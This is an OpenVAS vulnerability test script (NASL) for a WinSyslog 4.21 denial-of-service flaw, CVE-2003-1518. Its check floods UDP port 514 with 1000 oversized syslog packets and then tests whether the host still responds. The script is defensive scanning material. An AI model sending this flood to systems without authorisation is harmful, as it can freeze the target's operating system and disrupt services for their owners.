###############################################################################
# OpenVAS Vulnerability Test
# $Id: winsyslog_dos.nasl 8236 2017-12-22 10:28:23Z cfischer $
#
# WinSyslog (DoS)
#
# Authors:
# Matthew North
#
# Copyright:
# Copyright (C) 2003 Matthew North
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11884");
  script_version("$Revision: 8236 $");
  script_tag(name:"last_modification", value:"$Date: 2017-12-22 11:28:23 +0100 (Fri, 22 Dec 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_cve_id("CVE-2003-1518");
  script_bugtraq_id(8821);
  script_name("WinSyslog (DoS)");
  script_category(ACT_DENIAL);	# ACT_FLOOD?
  script_copyright("This script is Copyright (C) 2003 Matthew North");
  script_family("Denial of Service");
  script_dependencies("os_detection.nasl");
  script_require_udp_ports(514);
  script_mandatory_keys("Host/runs_windows");

  tag_summary = "WinSyslog is an enhanced syslog server for Windows. A vulnerability in the product allows 
  remote attackers to cause the WinSyslog to freeze, which in turn will also freeze the operating 
  system on which the product executes.";
	
  tag_affected = "WinSyslog Version 4.21 SP1 (http://www.winsyslog.com)";

  tag_solution = "Contact vendor http://www.winsyslog.com";

  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"solution", value:tag_solution);
  script_tag(name:"summary", value:tag_summary);

  script_tag(name:"qod_type", value:"remote_banner_unreliable");

  exit(0);
}

include("global_settings.inc");
include("host_details.inc");

port = 514;
if( ! get_udp_port_state( port ) ) exit( 0 );

soc = open_sock_udp( port );
if( ! soc ) exit( 0 );

start_denial();

for( i = 0; i < 1000; i++ ) {
  num = (600+i)*4;
  bufc = string( crap( num ) );
  buf = string("<00>", bufc);
  send( socket:soc, data:buf );
}

close( soc );
sleep( 5 );
alive = end_denial();
if( ! alive ) {
  security_message( port:port, proto:"udp" );
  exit( 0 );
}

exit( 99 );